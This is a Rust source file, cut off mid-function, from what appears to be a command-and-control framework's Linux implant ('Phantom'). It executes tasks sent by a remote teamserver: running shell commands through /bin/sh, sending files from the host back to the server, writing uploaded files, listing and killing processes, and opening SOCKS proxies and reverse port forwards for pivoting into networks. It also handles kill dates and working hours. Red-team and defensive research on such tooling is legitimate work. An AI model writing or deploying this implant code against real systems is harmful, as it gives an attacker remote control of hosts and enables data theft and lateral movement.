//! Linux task execution for the Phantom agent.

use std::collections::{BTreeMap, HashMap};
use std::ffi::OsString;
use std::fs;
use std::io::{ErrorKind, Read, Write};
use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream};
use std::os::unix::fs::MetadataExt;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::{SystemTime, UNIX_EPOCH};

use red_cell_common::demon::{
    DemonCallback, DemonCommand, DemonConfigKey, DemonFilesystemCommand, DemonNetCommand,
    DemonPackage, DemonProcessCommand, DemonSocketCommand, DemonSocketType, DemonTransferCommand,
};
use time::OffsetDateTime;
use tokio::net::TcpStream as TokioTcpStream;
use tokio::process::Command;

use crate::error::PhantomError;
use crate::parser::TaskParser;
use crate::protocol::executable_name;

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum PendingCallback {
    Output { request_id: u32, text: String },
    Error { request_id: u32, text: String },
    Exit { request_id: u32, exit_method: u32 },
    KillDate { request_id: u32 },
    Structured { command_id: u32, request_id: u32, payload: Vec<u8> },
    MemFileAck { request_id: u32, mem_file_id: u32, success: bool },
    FsUpload { request_id: u32, file_size: u32, path: String },
    Socket { request_id: u32, payload: Vec<u8> },
    FileOpen { request_id: u32, file_id: u32, file_size: u64, file_path: String },
    FileChunk { request_id: u32, file_id: u32, data: Vec<u8> },
    FileClose { request_id: u32, file_id: u32 },
}

#[derive(Debug, Default)]
pub(crate) struct PhantomState {
    mem_files: HashMap<u32, MemFile>,
    reverse_port_forwards: HashMap<u32, ReversePortForward>,
    socks_proxies: HashMap<u32, SocksProxy>,
    sockets: HashMap<u32, ManagedSocket>,
    local_relays: HashMap<u32, LocalRelayConnection>,
    socks_clients: HashMap<u32, SocksClient>,
    downloads: Vec<ActiveDownload>,
    pending_callbacks: Vec<PendingCallback>,
    /// Kill date set dynamically by the teamserver via `CommandKillDate` or `CommandConfig`.
    kill_date: Option<i64>,
    /// Working-hours bitmask set dynamically by the teamserver via `CommandConfig`.
    working_hours: Option<i32>,
}

#[derive(Debug)]
struct MemFile {
    expected_size: usize,
    data: Vec<u8>,
}

#[derive(Debug)]
struct ReversePortForward {
    listener: TcpListener,
    mode: ReversePortForwardMode,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ReversePortForwardMode {
    Teamserver,
    Local,
}

#[derive(Debug)]
struct SocksProxy {
    listener: TcpListener,
    bind_addr: u32,
    bind_port: u32,
}

#[derive(Debug)]
struct ManagedSocket {
    stream: TcpStream,
    socket_type: DemonSocketType,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
}

#[derive(Debug)]
struct LocalRelayConnection {
    left: TcpStream,
    right: TcpStream,
    parent_id: u32,
}

#[derive(Debug)]
struct SocksClient {
    stream: TcpStream,
    server_id: u32,
    state: SocksClientState,
}

#[derive(Debug)]
enum SocksClientState {
    Greeting { buffer: Vec<u8> },
    Request { buffer: Vec<u8> },
    Relay { target: TcpStream },
}

/// Default chunk size for file downloads (512 KiB).
const DOWNLOAD_CHUNK_SIZE: usize = 512 * 1024;

/// State of an active download in the agent.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DownloadTransferState {
    Running = 1,
    Stopped = 2,
    Remove = 3,
}

/// An active file download being sent back to the teamserver in chunks.
#[derive(Debug)]
struct ActiveDownload {
    file_id: u32,
    request_id: u32,
    file: std::fs::File,
    total_size: u64,
    read_size: u64,
    state: DownloadTransferState,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct SocksConnectRequest {
    atyp: u8,
    address: Vec<u8>,
    port: u16,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SocksRequestError {
    GeneralFailure,
    CommandNotSupported,
    AddressTypeNotSupported,
}

#[derive(Debug)]
struct FilesystemEntry {
    name: String,
    is_dir: bool,
    size: u64,
    modified: ModifiedTime,
}

#[derive(Debug)]
struct FilesystemListing {
    root_path: String,
    entries: Vec<FilesystemEntry>,
}

#[derive(Debug)]
struct ModifiedTime {
    day: u32,
    month: u32,
    year: u32,
    minute: u32,
    hour: u32,
}

#[derive(Debug)]
struct ProcessEntry {
    name: String,
    pid: u32,
    parent_pid: u32,
    session: u32,
    threads: u32,
    user: String,
    is_wow64: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct SessionEntry {
    client: String,
    user: String,
    active: u32,
    idle: u32,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ShareEntry {
    name: String,
    path: String,
    remark: String,
    access: u32,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct GroupEntry {
    name: String,
    description: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct UserEntry {
    name: String,
    is_admin: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct MemoryRegion {
    base: u64,
    size: u32,
    protect: u32,
    state: u32,
    mem_type: u32,
}

const PAGE_NOACCESS: u32 = 0x01;
const PAGE_READONLY: u32 = 0x02;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_WRITECOPY: u32 = 0x08;
const PAGE_EXECUTE: u32 = 0x10;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
const MEM_COMMIT: u32 = 0x1000;
const MEM_PRIVATE: u32 = 0x20_000;
const MEM_MAPPED: u32 = 0x40_000;
const MEM_IMAGE: u32 = 0x100_0000;
const SOCKS_VERSION: u8 = 5;
const SOCKS_METHOD_NO_AUTH: u8 = 0;
const SOCKS_METHOD_NOT_ACCEPTABLE: u8 = 0xFF;
const SOCKS_COMMAND_CONNECT: u8 = 1;
const SOCKS_REPLY_SUCCEEDED: u8 = 0;
const SOCKS_REPLY_GENERAL_FAILURE: u8 = 1;
const SOCKS_REPLY_COMMAND_NOT_SUPPORTED: u8 = 7;
const SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED: u8 = 8;

impl PhantomState {
    pub(crate) async fn poll(&mut self) -> Result<(), PhantomError> {
        self.accept_reverse_port_forward_clients().await?;
        self.accept_socks_proxy_clients()?;
        self.poll_sockets().await?;
        self.poll_local_relays()?;
        self.poll_socks_clients().await?;
        self.push_download_chunks();
        Ok(())
    }

    pub(crate) fn drain_callbacks(&mut self) -> Vec<PendingCallback> {
        std::mem::take(&mut self.pending_callbacks)
    }

    fn queue_callback(&mut self, callback: PendingCallback) {
        self.pending_callbacks.push(callback);
    }

    /// Return the kill date set dynamically by the teamserver, if any.
    pub(crate) fn kill_date(&self) -> Option<i64> {
        self.kill_date
    }

    /// Return the working-hours bitmask set dynamically by the teamserver, if any.
    pub(crate) fn working_hours(&self) -> Option<i32> {
        self.working_hours
    }

    /// Set or clear the dynamic kill date (Unix timestamp in seconds).
    #[cfg(test)]
    pub(crate) fn set_kill_date(&mut self, kill_date: Option<i64>) {
        self.kill_date = kill_date;
    }

    /// Queue a `CommandKillDate` callback to notify the teamserver that
    /// the kill date has been reached.
    pub(crate) fn queue_kill_date_callback(&mut self) {
        self.queue_callback(PendingCallback::KillDate { request_id: 0 });
    }

    /// Read a chunk from each running download and queue file-write callbacks.
    ///
    /// Downloads that have been fully read or marked for removal are cleaned up
    /// with a file-close callback.
    fn push_download_chunks(&mut self) {
        let mut finished_indices = Vec::new();

        for (index, download) in self.downloads.iter_mut().enumerate() {
            if download.state == DownloadTransferState::Stopped {
                continue;
            }

            if download.state == DownloadTransferState::Remove {
                finished_indices.push(index);
                continue;
            }

            let mut buf = vec![0u8; DOWNLOAD_CHUNK_SIZE];
            let read = match Read::read(&mut download.file, &mut buf) {
                Ok(n) => n,
                Err(_) => {
                    finished_indices.push(index);
                    continue;
                }
            };

            if read > 0 {
                buf.truncate(read);
                download.read_size += read as u64;
                self.pending_callbacks.push(PendingCallback::FileChunk {
                    request_id: download.request_id,
                    file_id: download.file_id,
                    data: buf,
                });
            }

            if read == 0 || download.read_size >= download.total_size {
                finished_indices.push(index);
            }
        }

        // Process removals in reverse order to maintain index validity.
        for &index in finished_indices.iter().rev() {
            let download = self.downloads.remove(index);
            self.pending_callbacks.push(PendingCallback::FileClose {
                request_id: download.request_id,
                file_id: download.file_id,
            });
        }
    }

    async fn accept_reverse_port_forward_clients(&mut self) -> Result<(), PhantomError> {
        let listener_ids = self.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
        let mut accepted = Vec::new();

        for listener_id in listener_ids {
            let Some(listener) = self.reverse_port_forwards.get(&listener_id) else {
                continue;
            };

            loop {
                match listener.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream
                            .set_nonblocking(true)
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                        accepted.push((
                            listener_id,
                            listener.mode,
                            listener.bind_addr,
                            listener.bind_port,
                            listener.forward_addr,
                            listener.forward_port,
                            stream,
                        ));
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                    Err(error) => {
                        return Err(PhantomError::Socket(error.to_string()));
                    }
                }
            }
        }

        for (listener_id, mode, bind_addr, bind_port, forward_addr, forward_port, stream) in
            accepted
        {
            match mode {
                ReversePortForwardMode::Teamserver => {
                    let socket_id = self.allocate_socket_id();
                    self.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::Client,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        },
                    );
                    self.queue_callback(PendingCallback::Socket {
                        request_id: 0,
                        payload: encode_socket_open(
                            socket_id,
                            bind_addr,
                            bind_port,
                            forward_addr,
                            forward_port,
                        ),
                    });

                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        self.remove_socket(socket_id);
                    }
                }
                ReversePortForwardMode::Local => {
                    if !self.reverse_port_forwards.contains_key(&listener_id) {
                        continue;
                    }
                    if let Ok(target) = connect_ipv4_target(forward_addr, forward_port as u16).await
                    {
                        self.local_relays.insert(
                            self.allocate_socket_id(),
                            LocalRelayConnection {
                                left: stream,
                                right: target,
                                parent_id: listener_id,
                            },
                        );
                    }
                }
            }
        }

        Ok(())
    }

    fn accept_socks_proxy_clients(&mut self) -> Result<(), PhantomError> {
        let server_ids = self.socks_proxies.keys().copied().collect::<Vec<_>>();
        let mut accepted = Vec::new();

        for server_id in server_ids {
            let Some(proxy) = self.socks_proxies.get(&server_id) else {
                continue;
            };

            loop {
                match proxy.listener.accept() {
                    Ok((stream, _peer)) => {
                        stream
                            .set_nonblocking(true)
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                        accepted.push((server_id, stream));
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                    Err(error) => return Err(PhantomError::Socket(error.to_string())),
                }
            }
        }

        for (server_id, stream) in accepted {
            if !self.socks_proxies.contains_key(&server_id) {
                continue;
            }
            self.socks_clients.insert(
                self.allocate_socket_id(),
                SocksClient {
                    stream,
                    server_id,
                    state: SocksClientState::Greeting { buffer: Vec::new() },
                },
            );
        }

        Ok(())
    }

    async fn poll_sockets(&mut self) -> Result<(), PhantomError> {
        let socket_ids = self.sockets.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for socket_id in socket_ids {
            let mut read_failure = None;
            let mut read_success = None;

            {
                let Some(socket) = self.sockets.get_mut(&socket_id) else {
                    continue;
                };

                let mut data = Vec::new();
                let mut buffer = [0_u8; 4096];

                loop {
                    match socket.stream.read(&mut buffer) {
                        Ok(0) => {
                            removals.push(socket_id);
                            break;
                        }
                        Ok(read) => data.extend_from_slice(&buffer[..read]),
                        Err(error) if error.kind() == ErrorKind::WouldBlock => break,
                        Err(error) => {
                            read_failure = Some(PendingCallback::Socket {
                                request_id: 0,
                                payload: encode_socket_read_failure(
                                    socket_id,
                                    socket.socket_type,
                                    raw_socket_error(&error),
                                ),
                            });
                            removals.push(socket_id);
                            break;
                        }
                    }
                }

                if !data.is_empty() {
                    read_success = Some(PendingCallback::Socket {
                        request_id: 0,
                        payload: encode_socket_read_success(socket_id, socket.socket_type, &data)?,
                    });
                }
            }

            if let Some(callback) = read_failure {
                self.queue_callback(callback);
            }
            if let Some(callback) = read_success {
                self.queue_callback(callback);
            }
        }

        for socket_id in removals {
            self.remove_socket(socket_id);
        }

        Ok(())
    }

    fn poll_local_relays(&mut self) -> Result<(), PhantomError> {
        let relay_ids = self.local_relays.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for relay_id in relay_ids {
            let Some(relay) = self.local_relays.get_mut(&relay_id) else {
                continue;
            };

            let left_result = pump_stream(&mut relay.left, &mut relay.right);
            let right_result = pump_stream(&mut relay.right, &mut relay.left);
            if left_result || right_result {
                removals.push(relay_id);
            }
        }

        for relay_id in removals {
            self.local_relays.remove(&relay_id);
        }

        Ok(())
    }

    async fn poll_socks_clients(&mut self) -> Result<(), PhantomError> {
        let client_ids = self.socks_clients.keys().copied().collect::<Vec<_>>();
        let mut removals = Vec::new();

        for client_id in client_ids {
            let Some(client) = self.socks_clients.get_mut(&client_id) else {
                continue;
            };

            match &mut client.state {
                SocksClientState::Greeting { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_greeting(buffer) {
                        None => {}
                        Some(Ok(consumed)) => {
                            let remainder = buffer.split_off(consumed);
                            write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, SOCKS_METHOD_NO_AUTH],
                            )
                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
                            client.state = SocksClientState::Request { buffer: remainder };
                        }
                        Some(Err(method)) => {
                            let _ =
                                write_all_nonblocking(&mut client.stream, &[SOCKS_VERSION, method]);
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Request { buffer } => {
                    let closed = read_available(&mut client.stream, buffer)?;
                    if closed {
                        removals.push(client_id);
                        continue;
                    }

                    match try_parse_socks_request(buffer) {
                        None => {}
                        Some(Ok((consumed, request))) => {
                            let remainder = buffer.split_off(consumed);
                            match connect_socks_target(request.atyp, &request.address, request.port)
                                .await
                            {
                                Ok(mut target) => {
                                    send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_SUCCEEDED,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    )?;
                                    if !remainder.is_empty() {
                                        write_all_nonblocking(&mut target, &remainder).map_err(
                                            |error| PhantomError::Socket(error.to_string()),
                                        )?;
                                    }
                                    client.state = SocksClientState::Relay { target };
                                }
                                Err(_error_code) => {
                                    send_socks_reply(
                                        &mut client.stream,
                                        SOCKS_REPLY_GENERAL_FAILURE,
                                        request.atyp,
                                        &request.address,
                                        request.port,
                                    )?;
                                    removals.push(client_id);
                                }
                            }
                        }
                        Some(Err(error)) => {
                            let reply = match error {
                                SocksRequestError::GeneralFailure => SOCKS_REPLY_GENERAL_FAILURE,
                                SocksRequestError::CommandNotSupported => {
                                    SOCKS_REPLY_COMMAND_NOT_SUPPORTED
                                }
                                SocksRequestError::AddressTypeNotSupported => {
                                    SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED
                                }
                            };
                            let _ = write_all_nonblocking(
                                &mut client.stream,
                                &[SOCKS_VERSION, reply, 0, 1, 0, 0, 0, 0, 0, 0],
                            );
                            removals.push(client_id);
                        }
                    }
                }
                SocksClientState::Relay { target } => {
                    let client_failed = pump_stream(&mut client.stream, target);
                    let target_failed = pump_stream(target, &mut client.stream);
                    if client_failed || target_failed {
                        removals.push(client_id);
                    }
                }
            }
        }

        for client_id in removals {
            self.socks_clients.remove(&client_id);
        }

        Ok(())
    }

    fn allocate_socket_id(&self) -> u32 {
        let mut socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        while self.sockets.contains_key(&socket_id)
            || self.reverse_port_forwards.contains_key(&socket_id)
            || self.socks_proxies.contains_key(&socket_id)
            || self.local_relays.contains_key(&socket_id)
            || self.socks_clients.contains_key(&socket_id)
        {
            socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
        }
        socket_id
    }

    fn remove_socket(&mut self, socket_id: u32) {
        let Some(socket) = self.sockets.remove(&socket_id) else {
            return;
        };

        let payload = match socket.socket_type {
            DemonSocketType::Client | DemonSocketType::ReversePortForward => {
                encode_rportfwd_remove(
                    socket_id,
                    socket.socket_type,
                    socket.bind_addr,
                    socket.bind_port,
                    socket.forward_addr,
                    socket.forward_port,
                )
            }
            DemonSocketType::ReverseProxy => {
                encode_socket_close(socket_id, DemonSocketType::ReverseProxy)
            }
        };

        self.queue_callback(PendingCallback::Socket { request_id: 0, payload });
    }

    fn remove_reverse_port_forward(&mut self, socket_id: u32) {
        let Some(listener) = self.reverse_port_forwards.remove(&socket_id) else {
            return;
        };

        let client_ids = self
            .sockets
            .iter()
            .filter_map(|(client_id, socket)| {
                (socket.socket_type == DemonSocketType::Client
                    && socket.bind_addr == listener.bind_addr
                    && socket.bind_port == listener.bind_port
                    && socket.forward_addr == listener.forward_addr
                    && socket.forward_port == listener.forward_port)
                    .then_some(*client_id)
            })
            .collect::<Vec<_>>();
        for client_id in client_ids {
            self.remove_socket(client_id);
        }

        let relay_ids = self
            .local_relays
            .iter()
            .filter_map(|(relay_id, relay)| (relay.parent_id == socket_id).then_some(*relay_id))
            .collect::<Vec<_>>();
        for relay_id in relay_ids {
            self.local_relays.remove(&relay_id);
        }

        self.queue_callback(PendingCallback::Socket {
            request_id: 0,
            payload: encode_rportfwd_remove(
                socket_id,
                DemonSocketType::ReversePortForward,
                listener.bind_addr,
                listener.bind_port,
                listener.forward_addr,
                listener.forward_port,
            ),
        });
    }
}

impl MemFile {
    fn append(&mut self, data: &[u8]) {
        self.data.extend_from_slice(data);
        if self.data.len() > self.expected_size {
            self.data.truncate(self.expected_size);
        }
    }

    fn is_complete(&self) -> bool {
        self.data.len() == self.expected_size
    }
}

/// Execute a single Demon task package.
pub(crate) async fn execute(
    package: &DemonPackage,
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    match package.command()? {
        DemonCommand::CommandNoJob => {}
        DemonCommand::CommandSleep => {
            let mut parser = TaskParser::new(&package.payload);
            let sleep_ms = parser.int32()?;
            state.queue_callback(PendingCallback::Output {
                request_id: package.request_id,
                text: format!("sleep updated to {sleep_ms} ms"),
            });
        }
        DemonCommand::CommandFs => {
            execute_filesystem(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandProcList => {
            let payload = execute_process_list(&package.payload)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProcList),
                request_id: package.request_id,
                payload,
            });
        }
        DemonCommand::CommandProc => {
            execute_process(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandNet => {
            execute_network(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandSocket => {
            execute_socket(package.request_id, &package.payload, state).await?;
        }
        DemonCommand::CommandMemFile => {
            execute_memfile(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandTransfer => {
            execute_transfer(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandKillDate => {
            let mut parser = TaskParser::new(&package.payload);
            let kill_date = parser.int64()?;
            state.kill_date = if kill_date > 0 { Some(kill_date) } else { None };
            let label = if kill_date > 0 {
                format!("kill date set to {kill_date}")
            } else {
                String::from("kill date disabled")
            };
            state.queue_callback(PendingCallback::Output {
                request_id: package.request_id,
                text: label,
            });
        }
        DemonCommand::CommandConfig => {
            execute_config(package.request_id, &package.payload, state)?;
        }
        DemonCommand::CommandExit => {
            let mut parser = TaskParser::new(&package.payload);
            let exit_method = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative exit method"))?;
            state.queue_callback(PendingCallback::Exit {
                request_id: package.request_id,
                exit_method,
            });
        }
        command => {
            state.queue_callback(PendingCallback::Error {
                request_id: package.request_id,
                text: format!("phantom does not implement command {command:?} yet"),
            });
        }
    }

    Ok(())
}

/// Handle `CommandConfig` (ID 2500): reconfigure live agent parameters.
///
/// The payload starts with a config key (u32) followed by key-specific data.
/// For Linux-relevant keys the value is applied and echoed back as a
/// [`PendingCallback::Structured`] response.  Windows-only keys are rejected
/// with an error callback.
fn execute_config(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let raw_key = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative config key"))?;

    let key = match DemonConfigKey::try_from(raw_key) {
        Ok(key) => key,
        Err(_) => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!("unknown config key {raw_key}"),
            });
            return Ok(());
        }
    };

    match key {
        DemonConfigKey::KillDate => {
            let kill_date = parser.int64()?;
            state.kill_date = if kill_date > 0 { Some(kill_date) } else { None };

            let mut response = encode_u32(raw_key);
            response.extend_from_slice(&encode_u64(u64::try_from(kill_date).unwrap_or_default()));
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandConfig),
                request_id,
                payload: response,
            });
        }
        DemonConfigKey::WorkingHours => {
            let hours = parser.int32()?;
            let hours_u32 = u32::try_from(hours)
                .map_err(|_| PhantomError::TaskParse("negative working hours value"))?;
            state.working_hours = if hours_u32 != 0 {
                Some(
                    i32::try_from(hours_u32)
                        .map_err(|_| PhantomError::TaskParse("working hours overflow"))?,
                )
            } else {
                None
            };

            let mut response = encode_u32(raw_key);
            response.extend_from_slice(&encode_u32(hours_u32));
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandConfig),
                request_id,
                payload: response,
            });
        }
        // Windows-only configuration keys — not applicable to Linux.
        DemonConfigKey::ImplantSpfThreadStart
        | DemonConfigKey::ImplantVerbose
        | DemonConfigKey::ImplantSleepTechnique
        | DemonConfigKey::ImplantCoffeeThreaded
        | DemonConfigKey::ImplantCoffeeVeh
        | DemonConfigKey::MemoryAlloc
        | DemonConfigKey::MemoryExecute
        | DemonConfigKey::InjectTechnique
        | DemonConfigKey::InjectSpoofAddr
        | DemonConfigKey::InjectSpawn64
        | DemonConfigKey::InjectSpawn32 => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: format!("config key {key:?} is not supported on Linux"),
            });
        }
    }

    Ok(())
}

async fn execute_filesystem(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative filesystem subcommand"))?;
    let subcommand = DemonFilesystemCommand::try_from(subcommand)?;

    match subcommand {
        DemonFilesystemCommand::Dir => {
            let _file_explorer = parser.bool32()?;
            let target = normalize_path(&parser.wstring()?);
            let subdirs = parser.bool32()?;
            let files_only = parser.bool32()?;
            let dirs_only = parser.bool32()?;
            let list_only = parser.bool32()?;
            let _starts = parser.wstring()?;
            let _contains = parser.wstring()?;
            let _ends = parser.wstring()?;
            let payload =
                encode_fs_dir_listing(&target, subdirs, files_only, dirs_only, list_only)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload,
            });
        }
        DemonFilesystemCommand::Download => {
            let path = normalize_path(&parser.wstring()?);
            let file = fs::File::open(&path).map_err(|error| io_error(&path, error))?;
            let metadata = file.metadata().map_err(|error| io_error(&path, error))?;
            let total_size = metadata.len();
            let file_id: u32 = rand::random();
            let full_path =
                fs::canonicalize(&path).unwrap_or_else(|_| path.clone()).display().to_string();

            state.queue_callback(PendingCallback::FileOpen {
                request_id,
                file_id,
                file_size: total_size,
                file_path: full_path,
            });
            state.downloads.push(ActiveDownload {
                file_id,
                request_id,
                file,
                total_size,
                read_size: 0,
                state: DownloadTransferState::Running,
            });
        }
        DemonFilesystemCommand::Cat => {
            let path = normalize_path(&parser.wstring()?);
            let contents = fs::read(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_cat(&path, &contents)?,
            });
        }
        DemonFilesystemCommand::Upload => {
            let path = normalize_path(&parser.wstring()?);
            let mem_file_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
            let Some(mem_file) = state.mem_files.get(&mem_file_id) else {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("memfile {mem_file_id:#x} was not found"),
                });
                return Ok(());
            };
            if !mem_file.is_complete() {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("memfile {mem_file_id:#x} is incomplete"),
                });
                return Ok(());
            }

            fs::write(&path, &mem_file.data).map_err(|error| io_error(&path, error))?;
            let file_size = u32::try_from(mem_file.data.len())
                .map_err(|_| PhantomError::InvalidResponse("uploaded file too large"))?;
            state.queue_callback(PendingCallback::FsUpload {
                request_id,
                file_size,
                path: path.display().to_string(),
            });
            state.mem_files.remove(&mem_file_id);
        }
        DemonFilesystemCommand::Cd => {
            let path = normalize_path(&parser.wstring()?);
            std::env::set_current_dir(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::Cd, &path)?,
            });
        }
        DemonFilesystemCommand::Remove => {
            let path = normalize_path(&parser.wstring()?);
            let is_dir = path.is_dir();
            if path.is_dir() {
                fs::remove_dir(&path).map_err(|error| io_error(&path, error))?;
            } else {
                fs::remove_file(&path).map_err(|error| io_error(&path, error))?;
            }
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_remove(&path, is_dir)?,
            });
        }
        DemonFilesystemCommand::Mkdir => {
            let path = normalize_path(&parser.wstring()?);
            fs::create_dir_all(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::Mkdir, &path)?,
            });
        }
        DemonFilesystemCommand::Copy => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::copy(&from, &to).map_err(|error| io_error(&from, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_copy_move(DemonFilesystemCommand::Copy, true, &from, &to)?,
            });
        }
        DemonFilesystemCommand::Move => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::rename(&from, &to).map_err(|error| io_error(&from, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_copy_move(DemonFilesystemCommand::Move, true, &from, &to)?,
            });
        }
        DemonFilesystemCommand::GetPwd => {
            let path = std::env::current_dir()
                .map_err(|error| PhantomError::Process(error.to_string()))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::GetPwd, &path)?,
            });
        }
    }

    Ok(())
}

fn execute_process_list(payload: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let mut parser = TaskParser::new(payload);
    let process_ui = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process ui flag"))?;
    let processes = enumerate_processes()?;
    encode_process_list(process_ui, &processes)
}

async fn execute_process(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process subcommand"))?;
    let subcommand = DemonProcessCommand::try_from(subcommand)?;

    match subcommand {
        DemonProcessCommand::Create => {
            let _process_state = parser.int32()?;
            let process = parser.wstring()?;
            let process_args = parser.wstring()?;
            let piped = parser.bool32()?;
            let verbose = parser.bool32()?;

            let binary = if process.is_empty() { String::from("/bin/sh") } else { process };

            let mut command = Command::new(&binary);
            if process_args.is_empty() {
                if binary == "/bin/sh" {
                    command.arg("-c").arg("true");
                }
            } else if binary == "/bin/sh" {
                command.arg("-c").arg(process_args);
            } else {
                command.args(split_args(&process_args));
            }
            if piped {
                command.stdout(Stdio::piped()).stderr(Stdio::piped());
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                let pid = child.id().unwrap_or_default();
                let output = child
                    .wait_with_output()
                    .await
                    .map_err(|error| PhantomError::Process(error.to_string()))?;
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandProc),
                    request_id,
                    payload: encode_proc_create(&binary, pid, true, true, verbose)?,
                });
                let mut merged = String::from_utf8_lossy(&output.stdout).into_owned();
                if !output.stderr.is_empty() {
                    if !merged.is_empty() {
                        merged.push('\n');
                    }
                    merged.push_str(&String::from_utf8_lossy(&output.stderr));
                }
                state.queue_callback(PendingCallback::Output { request_id, text: merged });
            } else {
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandProc),
                    request_id,
                    payload: encode_proc_create(
                        &binary,
                        child.id().unwrap_or_default(),
                        true,
                        false,
                        verbose,
                    )?,
                });
            }
        }
        DemonProcessCommand::Kill => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let success = Command::new("kill")
                .arg("-9")
                .arg(pid.to_string())
                .status()
                .await
                .map_err(|error| PhantomError::Process(error.to_string()))?
                .success();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_kill(success, pid),
            });
        }
